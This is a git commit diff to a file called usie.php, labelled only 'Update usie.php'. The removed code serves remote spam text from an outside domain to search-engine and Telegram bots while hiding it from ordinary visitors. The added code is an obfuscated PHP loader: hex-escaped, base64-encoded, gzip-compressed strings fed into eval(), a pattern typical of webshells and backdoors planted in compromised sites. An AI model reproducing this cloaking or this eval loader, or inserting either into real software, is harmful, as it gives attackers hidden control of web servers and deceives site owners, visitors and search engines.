0fe5d5f49180377536465d866332c91391fbdd81
eagles227 <166109731+eagles227@users.noreply.github.com>
2024-12-15 19:45:01 +0700

    Update usie.php

--- usie.php
+++ usie.php
@@ -1,20 +1,7 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER["HTTP_USER_AGENT"];
-    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
-
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-if (is_bot()) {
-    $message = file_get_contents("https://woulddataroom.com/usie/sicantik.txt");
-    echo $message;
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x42uEq6MKRrqDt9U0ph\x63jq/dh/yfszVy1/\x63L67\x62SY5Ge\x43IXfeWwFD4sgFRFOdIKPgg5ww9psHnnx6\x61GgDXy\x43OjFrDHIge4yhD62Vz\x43\x63Owtt2\x61oT0\x41YW\x62z\x61em7x1MS5F6q74wg1svtNyHMNSsqh\x437ptln\x61qowQGp3N41E\x2bvtpRpzuqKH1q9\x63z/mEVJZlusvqSj/s0u\x61Vfpx0J\x63Yj6e45EH11yJN\x61\x61\x2bjxgojGwElr7vUjPiVFY\x43G\x63lUkqonFskkF\x43Jt0F\x63Onk/uvZG306wVL167\x2bNR/NHrImPJJf3Mrufur2KlmJz\x41nTqwweWKSq0\x61kOu4Vevosh8Ms\x63IJKePOiRMyIhlr3UOrIfmmioOjEP2sr66e6uSlzhd8ZtdWyMo4\x63NVWk/Ylo\x41Zypi2v0F9wU1sP7\x43\x62wqP4\x62Rr0r\x42R8HS\x61iDXjm33\x43GNJN/Synf3EkU\x616\x61QEU\x63lU\x42\x63\x61652hZLo6IYMuu5P4rdvG\x2brS31L7j\x62n\x41uqh7h/uYfR0zR8D\x2bdj1kuved44Hy6JlI/\x2brXj2Q0\x2bxPI83\x62hlxP\x62znge89\x62Y6v\x4134L\x434R/S0qTH671\x2bLupY\x2btE\x2bm\x42v\x43tVYrYKN\x61FlP\x2bL\x2bd\x42HjIi/DtgSq4YQ\x63KTqhxygN2OsNZwLwqjFQgRQEy\x42IwrOqUyY\x63ZYsHL/luXnX4v2\x62R9WR0Xu\x62d\x2bOLuws\x2bgK0HG8hwj\x43GPWqGEt0wUOJ\x41WFTNylkiPxVSdOr7m25ENPz\x43VyUjipXG6Neoz1YzuYeGqmo\x62w\x2b4lJio3n7ez\x2bwz\x63LDloonNRsh/Vg3/3d\x63L\x42Ovnpl67kY3Qr4Nk0mxrUS\x616gok1eNZo2HO\x42m\x43\x41RFEs/T9r8\x42\x42Q\x62\x2bWXU1\x62/dKgY\x42wJe9Lp\x41tFQ/NKg\x63\x42wJe9Lo\x419FQ/9Jgg\x42wJe9Ln\x41NGQ/tJgk\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 ?>
 
 <?php
